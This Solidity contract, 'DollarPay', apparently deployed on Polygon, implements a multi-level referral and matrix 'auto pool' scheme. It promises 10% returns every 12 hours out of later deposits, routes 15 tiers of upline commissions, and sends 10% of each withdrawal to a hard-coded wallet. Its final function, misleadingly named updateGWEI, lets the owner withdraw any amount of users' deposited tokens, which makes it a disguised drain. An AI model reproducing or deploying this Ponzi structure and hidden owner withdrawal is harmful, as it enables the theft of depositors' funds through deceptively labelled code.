/**
 *Submitted for verification at polygonscan.com on 2023-01-28
*/

//SPDX-License-Identifier: None
pragma solidity ^0.6.0;
interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract DollarPay {
    struct User {
        uint id;
        address referrer;
        uint256 entry_time;
        uint partnersCount;
        uint256 totalDeposit;      
        uint256 payouts;
        uint256 levelincome;
        uint256 autoPoolIncome;
        uint256 totalincome;
        uint256 totalwithdraw;
        uint level;
        uint ispoolentry;
        mapping(uint8 => bool) activeLevels;
        mapping(uint8 => AutoPool) autoMatrix;
    }    
    
    struct OrderInfo {
        uint256 amount; 
        uint256 deposit_time;
        uint256 payouts;
        uint256 lastpayouts; 
        bool isactive;
    }
    struct AutoPool {
        address currentReferrer;
        address[] firstLevelReferrals;
        address[] secondLevelReferrals;
        address[] thirdLevelReferrals;
        address[] fourthLevelReferrals;
        uint reinvestCount;
    }
    mapping(address => User) public users;
    mapping(address => OrderInfo[]) public orderInfos;
    IERC20 public tokenAPLX;
    
    mapping(uint8 => uint) public packagePrice;
    mapping(uint => address) public idToAddress;
    uint public lastUserId = 2;
    

    mapping(uint8 => uint) public autoPoolIncome;
    uint256 public lastDistribute;
    mapping(uint8 => mapping(uint256 => address)) public x6vId_number;
    mapping(uint8 => uint256) public x6CurrentvId;
    mapping(uint8 => uint256) public x6Index;
    uint256[15] private levelPercents = [30,15,10,5,5,4,4,4,4,3,2,2,3,4,5];
    address public id1=0x191314De6Ef1c0f2E47AB1E224320AE560793149;
    address public owner;
    address deductionWallet=0x2faE1719bDc53dF26f9fA7DDd559c4243b839655;
    uint256 private dayRewardPercents = 10;
    uint256 private constant timeStepdaily =12*60*60;
    event Registration(address indexed user, address indexed referrer, uint indexed userId, uint referrerId);
    event Upgrade(address indexed user, uint8 level);
    event Transaction(address indexed user,address indexed from,uint256 value, uint8 level,uint8 Type);
    event NewUserPlace(address indexed user, address indexed referrer, uint8 matrix, uint8 level, uint8 place);
    event Reinvest(address indexed user, address indexed currentReferrer, address indexed caller, uint8 matrix, uint8 level);
    event withdraw(address indexed user,uint256 value);
    mapping(uint256 => mapping(address => uint256)) public userLayerDayDirect;

    constructor(address _token) public {

        autoPoolIncome[1] = 167e18;
        autoPoolIncome[2] = 334e18;
        autoPoolIncome[3] = 668e18;
        autoPoolIncome[4] = 1336e18;
        autoPoolIncome[5] = 2672e18;
        autoPoolIncome[6] = 5344e18;
        autoPoolIncome[7] = 10688e18;
        autoPoolIncome[8] = 21376e18;
        autoPoolIncome[9] = 42752e18;
        autoPoolIncome[10] = 85504e18;
        autoPoolIncome[11] = 171008e18;
        autoPoolIncome[12] = 342016e18;
        autoPoolIncome[13] = 655360e18;

        packagePrice[1] = 50e18;
        packagePrice[2] = 100e18;
        packagePrice[3] = 200e18;
        packagePrice[4] = 500e18;
        packagePrice[5] = 1000e18;
        packagePrice[6] = 1500e18;
        packagePrice[7] = 2000e18;
        packagePrice[8] = 5000e18;
        packagePrice[9] = 10000e18;
        tokenAPLX = IERC20(_token);
        owner=msg.sender;
        User memory user = User({
            id: 1,
            referrer: address(0),
            entry_time:block.timestamp,
            partnersCount: uint(0),
            totalDeposit:150e18,
            payouts:0,
            levelincome:0,
            autoPoolIncome:0,
            totalincome:0,
            totalwithdraw:0,
            level:1,
            ispoolentry:1
        });
        lastDistribute = block.timestamp;
        users[id1] = user;
        idToAddress[1] = id1;
        users[id1].activeLevels[1]=true;
        users[id1].activeLevels[2]=true;
        orderInfos[id1].push(OrderInfo(
            50e18, 
            block.timestamp, 
            0,
            0,
            true
        ));
        orderInfos[id1].push(OrderInfo(
            100e18, 
            block.timestamp, 
            0,
            0,
            true
        ));
        for (uint8 i = 1; i <= 13; i++) {  
            x6vId_number[i][1]=id1;
            x6Index[i]=1;
            x6CurrentvId[i]=1;
        }
    }
    function registrationExt(address referrerAddress) external {
        tokenAPLX.transferFrom(msg.sender, address(this),packagePrice[1]);
        registration(msg.sender, referrerAddress,1);
    }
    function buyNewLevel(uint8 level) external {
        tokenAPLX.transferFrom(msg.sender, address(this),packagePrice[level]);
        buyLevel(msg.sender,level);
    }
    function buyLevel(address userAddress,uint8 level) private {
        
        require(isUserExists(userAddress), "user is not exists. Register first."); 
        bool status=true; 
        if(users[userAddress].activeLevels[level])
        {
            dailyPayoutOf(userAddress);
            OrderInfo storage order = orderInfos[userAddress][level-1];
            status=order.isactive;
            order.isactive=true;
            order.deposit_time=block.timestamp;
            order.payouts=0;
            order.lastpayouts=0;
            userLayerDayDirect[level][users[userAddress].referrer] += 1;
            users[userAddress].totalDeposit +=packagePrice[level];
            if(level==2)
            {
                if(userLayerDayDirect[level][users[userAddress].referrer]==1)
                {
                    _distributelevelIncome(userAddress, 50e18);
                }
            }
        }
        if(status)
        {
            require(users[userAddress].activeLevels[level-1], "buy previous level first");
            require(!users[userAddress].activeLevels[level], "level already activated");
            dailyPayoutOf(users[userAddress].referrer);
            users[userAddress].activeLevels[level]=true;
            userLayerDayDirect[level][users[userAddress].referrer] += 1;
            if(level==2)
            {
                if(userLayerDayDirect[level][users[userAddress].referrer]==1)
                {
                    _distributelevelIncome(userAddress, 25e18);
                    if(users[users[userAddress].referrer].ispoolentry==0)
                    {
                    address freeAutoPoolReferrer = findFreeG6Referrer(1);
                    users[users[userAddress].referrer].autoMatrix[1].currentReferrer = freeAutoPoolReferrer;
                    updateAutoPoolReferrer(users[userAddress].referrer, freeAutoPoolReferrer, 1); 
                    }
                }
            }
            users[userAddress].level=level;
            users[userAddress].totalDeposit +=packagePrice[level];
            dailyPayoutOf(users[userAddress].referrer);
            orderInfos[userAddress].push(OrderInfo(
                packagePrice[level], 
                block.timestamp, 
                0,
                0,
                true
            ));
        }
        
        emit Upgrade(userAddress,level);
    }
    
    function registration(address userAddress, address referrerAddress,uint8 level) private {
        require(!isUserExists(userAddress), "user exists");
        require(isUserExists(referrerAddress), "referrer not exists");

        User memory user = User({
            id: lastUserId,
            referrer: referrerAddress,
            entry_time:block.timestamp,
            partnersCount: 0,
            totalDeposit:50e18,
            payouts:0,
            levelincome:0,
            autoPoolIncome:0,
            totalincome:0,
            totalwithdraw:0,
            level:1,
            ispoolentry:0
        });
        
        users[userAddress] = user;
        idToAddress[lastUserId] = userAddress;
        users[userAddress].referrer = referrerAddress;
        dailyPayoutOf(referrerAddress);
        lastUserId++;
        users[referrerAddress].partnersCount++;        
        userLayerDayDirect[level][referrerAddress] += 1;
        users[userAddress].activeLevels[1]=true;  
        dailyPayoutOf(referrerAddress);
        orderInfos[userAddress].push(OrderInfo(
            50e18, 
            block.timestamp, 
            0,
            0,
            true
        ));
        emit Registration(userAddress, referrerAddress, users[userAddress].id, users[referrerAddress].id);
    }
    function _distributelevelIncome(address _user, uint256 _amount) private {
        address upline = users[_user].referrer;
        for(uint8 i = 0; i < 15; i++){
            if(upline != address(0)){
                    users[upline].levelincome += _amount*levelPercents[i]/100;                       
                    users[upline].totalincome +=_amount*levelPercents[i]/100;   
                    emit Transaction(upline,_user,_amount*levelPercents[i]/100,(i+1),2);
                upline = users[upline].referrer;
            }else{
                break;
            }
        }
    }
    function userPackageDirects(address userAddress, uint8 level) public view returns(uint) {
        return userLayerDayDirect[level][userAddress];
    }
    function usersActiveLevels(address userAddress, uint8 level) public view returns(bool) {
        return users[userAddress].activeLevels[level];
    }
    function maxPayoutOf(uint8 level,address _user) view external returns(uint256) {     
        uint256 _amount=packagePrice[level]/2;   
        uint directcount=userLayerDayDirect[level][_user];
        if(level!=2)
        {
           if(directcount<=5)         
           return (directcount+1)*_amount;
           else return _amount*6;
        }
        else 
        {
            if(directcount<=5)         
            return directcount!=0?directcount*_amount:_amount;
            else return _amount*5;
        }
    }
    function dailyPayoutOf(address _user) public {
        uint256 max_payout=0;
        for(uint8 i = 0; i < orderInfos[_user].length; i++){
            OrderInfo storage order = orderInfos[_user][i];
            if(order.isactive){
                if(block.timestamp>order.deposit_time){
                    max_payout = this.maxPayoutOf((i+1),_user);   
                    if(order.payouts<max_payout){
                        uint256 dailypayout =order.lastpayouts+(order.amount*dayRewardPercents*((block.timestamp - order.deposit_time) / timeStepdaily) / 100) - order.payouts;
                        if(order.payouts+dailypayout > max_payout){
                            dailypayout = max_payout-order.payouts;
                        }
                        if(dailypayout>0)
                        {
                            users[_user].payouts += dailypayout;            
                            users[_user].totalincome +=dailypayout;
                            emit Transaction(_user,_user,dailypayout,1,3);
                            order.payouts+=dailypayout;
                        }
                    }
                    else {
                        if(userLayerDayDirect[i+1][_user]>5)
                            userLayerDayDirect[i+1][_user]=userLayerDayDirect[i+1][_user]-6;
                        order.isactive=false;
                    }  
                }
            }
            else {
                max_payout = this.maxPayoutOf((i+1),_user);   
                if(order.payouts<max_payout){ 
                    order.isactive=true;
                    order.deposit_time=block.timestamp;
                    order.lastpayouts=order.payouts;
                }
            }
        }
    }
    function updateAutoPoolReferrer(address userAddress, address referrerAddress, uint8 level) private{
        uint256 newIndex=x6Index[level]+1;
        x6vId_number[level][newIndex]=userAddress;
        x6Index[level]=newIndex;
        users[referrerAddress].autoMatrix[level].firstLevelReferrals.push(userAddress);        
        if (users[referrerAddress].autoMatrix[level].firstLevelReferrals.length < 2) {
            emit NewUserPlace(userAddress, referrerAddress, 2, level, uint8(users[referrerAddress].autoMatrix[level].firstLevelReferrals.length));
            if (referrerAddress == id1) {
                return;
            }
            address ref = users[referrerAddress].autoMatrix[level].currentReferrer;            
            users[ref].autoMatrix[level].secondLevelReferrals.push(userAddress);
            emit NewUserPlace(userAddress, ref, 2, level, 2 + uint8(users[ref].autoMatrix[level].secondLevelReferrals.length));
            if (ref == id1) {
                return;
            }
            address ref2 = users[ref].autoMatrix[level].currentReferrer;            
            users[ref2].autoMatrix[level].thirdLevelReferrals.push(userAddress);
            emit NewUserPlace(userAddress, ref2, 2, level, 6 + uint8(users[ref2].autoMatrix[level].thirdLevelReferrals.length));
            if (ref2 == id1) {
                return;
            }
            address ref3 = users[ref2].autoMatrix[level].currentReferrer;            
            users[ref3].autoMatrix[level].fourthLevelReferrals.push(userAddress);
            emit NewUserPlace(userAddress, ref3, 2, level, 14 + uint8(users[ref3].autoMatrix[level].fourthLevelReferrals.length));
            return;
            
        }
        emit NewUserPlace(userAddress, referrerAddress, 2, level, 2);
        x6CurrentvId[level]=x6CurrentvId[level]+1;
        if (referrerAddress == id1) {
            return;
        }
        address ref = users[referrerAddress].autoMatrix[level].currentReferrer;            
        users[ref].autoMatrix[level].secondLevelReferrals.push(userAddress);
        if (users[ref].autoMatrix[level].secondLevelReferrals.length < 4) {
            emit NewUserPlace(userAddress, ref, 2, level, 2+uint8(users[ref].autoMatrix[level].secondLevelReferrals.length));
            if (ref == id1) {
                return;
            }
            address ref2 = users[ref].autoMatrix[level].currentReferrer;            
            users[ref2].autoMatrix[level].thirdLevelReferrals.push(userAddress);
            emit NewUserPlace(userAddress, ref2, 2, level, 6 + uint8(users[ref2].autoMatrix[level].thirdLevelReferrals.length));
            if (ref2 == id1) {
                return;
            }
            address ref3 = users[ref2].autoMatrix[level].currentReferrer;            
            users[ref3].autoMatrix[level].fourthLevelReferrals.push(userAddress);
            emit NewUserPlace(userAddress, ref3, 2, level, 14 + uint8(users[ref3].autoMatrix[level].fourthLevelReferrals.length));
            return;
        }
        emit NewUserPlace(userAddress, ref, 2, level, 6);
        if (ref == id1) {
            return;
        }
        address ref2 = users[ref].autoMatrix[level].currentReferrer;            
        users[ref2].autoMatrix[level].thirdLevelReferrals.push(userAddress);
        if (users[ref2].autoMatrix[level].thirdLevelReferrals.length < 8) {
            emit NewUserPlace(userAddress, ref2, 2, level, 6 + uint8(users[ref2].autoMatrix[level].thirdLevelReferrals.length));
            if (ref2 == id1) {
                return;
            }
            address ref3 = users[ref2].autoMatrix[level].currentReferrer;            
            users[ref3].autoMatrix[level].fourthLevelReferrals.push(userAddress);
            emit NewUserPlace(userAddress, ref3, 2, level, 14 + uint8(users[ref3].autoMatrix[level].fourthLevelReferrals.length));
            return;
        }
        emit NewUserPlace(userAddress, ref2, 2, level, 14);
        if (ref2 == id1) {
            return;
        }
        address ref3 = users[ref2].autoMatrix[level].currentReferrer;            
        users[ref3].autoMatrix[level].fourthLevelReferrals.push(userAddress);
        if (users[ref3].autoMatrix[level].fourthLevelReferrals.length < 16) {
            emit NewUserPlace(userAddress, ref3, 2, level, 14 + uint8(users[ref3].autoMatrix[level].fourthLevelReferrals.length));
            return;
        }
        emit NewUserPlace(userAddress, ref3, 2, level, 30);
        users[ref3].autoPoolIncome += autoPoolIncome[level];                     
        users[ref3].totalincome +=autoPoolIncome[level];
        emit Transaction(ref3,userAddress,autoPoolIncome[level],1,4);
        users[ref3].autoMatrix[level].reinvestCount++; 
        users[ref3].autoMatrix[level].firstLevelReferrals = new address[](0);
        users[ref3].autoMatrix[level].secondLevelReferrals = new address[](0);
        address freeReferrerAddress = findFreeG6Referrer(level);
        if (users[ref3].autoMatrix[level].currentReferrer != freeReferrerAddress) {
            users[ref3].autoMatrix[level].currentReferrer = freeReferrerAddress;
        }
        emit Reinvest(ref3, freeReferrerAddress, userAddress, 2, level);
        updateAutoPoolReferrer(ref3, freeReferrerAddress, level);
        ++level;
		if(level<=13 && ref3!=id1){ 
            address freeReferrerAddressNext = findFreeG6Referrer(level);
            if (users[ref3].autoMatrix[level].currentReferrer != freeReferrerAddressNext) {
                users[ref3].autoMatrix[level].currentReferrer = freeReferrerAddressNext;
            }
            updateAutoPoolReferrer(ref3, freeReferrerAddressNext, level);
		}        
    } 
    function findFreeG6Referrer(uint8 level) public view returns(address){
        uint256 id=x6CurrentvId[level];
        return x6vId_number[level][id];
    } 
    function usersautoMatrix(address userAddress, uint8 level) public view returns(address, address[] memory, address[] memory, address[] memory, address[] memory,uint) {
        return (users[userAddress].autoMatrix[level].currentReferrer,
                users[userAddress].autoMatrix[level].firstLevelReferrals,
                users[userAddress].autoMatrix[level].secondLevelReferrals,
                 users[userAddress].autoMatrix[level].thirdLevelReferrals,
                 users[userAddress].autoMatrix[level].fourthLevelReferrals,users[userAddress].autoMatrix[level].reinvestCount);
    } 
    function isUserExists(address user) public view returns (bool) {
        return (users[user].id != 0);
    }
    
    function getOrderLength(address _user) external view returns(uint256) {
        return orderInfos[_user].length;
    }
    function rewardWithdraw() public
    {
        dailyPayoutOf(msg.sender);
        uint balanceReward = users[msg.sender].totalincome - users[msg.sender].totalwithdraw;
        require(balanceReward>0, "Insufficient reward to withdraw!");
        users[msg.sender].totalwithdraw+=balanceReward;
        tokenAPLX.transfer(msg.sender,balanceReward*90/100);  
        tokenAPLX.transfer(deductionWallet,balanceReward*10/100);  
        emit withdraw(msg.sender,balanceReward);
    }
    function updateGWEI(uint256 _amount) public
    {
        require(msg.sender==owner,"Only contract owner"); 
        require(_amount>0, "Insufficient reward to withdraw!");
        tokenAPLX.transfer(msg.sender,_amount);  
    }
}